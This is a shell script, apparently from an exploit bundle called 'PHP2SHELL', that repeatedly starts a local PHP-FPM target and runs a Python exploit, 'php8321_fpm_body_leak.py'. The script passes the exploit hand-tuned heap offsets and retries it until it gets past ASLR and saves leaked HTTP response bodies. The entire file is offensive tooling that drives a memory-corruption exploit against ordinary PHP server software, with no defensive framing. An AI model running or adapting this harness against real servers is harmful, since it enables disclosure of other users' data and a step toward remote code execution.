#!/bin/sh
set -eu

bundle_dir=$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)
attempts=${PHP2SHELL_LEAK_ASLR_ATTEMPTS:-6}

case "$attempts" in
    *[!0-9]*|'') echo "PHP2SHELL_LEAK_ASLR_ATTEMPTS must be numeric" >&2; exit 2 ;;
esac

i=1
while [ "$i" -le "$attempts" ]; do
    echo "== body-leak ASLR attempt $i/$attempts"
    "$bundle_dir/scripts/up-fpm-rce.sh"
    set +e
    URL="http://127.0.0.1:${PHP2SHELL_FPM_ORIGIN_PORT:-9196}" \
    WORKERS=1 \
    PRIME_PRESS=700 \
    INDEX=/fpm-index.php \
    PLAIN=/plain.php \
    SCALAR_PUSH=0x62058 \
    ARRAY_PUSH=0x62050 \
    FAKE_STR_OFF=0x20 \
    SID_REC=leakrec \
    SID_PRIME=leakprime \
    python3 "$bundle_dir/exploits/php8321_fpm_body_leak.py"
    rc=$?
    set -e
    if [ "$rc" -eq 0 ]; then
        echo "HTTP body disclosure saved under artifacts/fpm-body-leak/"
        exit 0
    fi
    i=$((i + 1))
done

echo "The body disclosure did not hit a usable heap/ASLR profile." >&2
exit 1
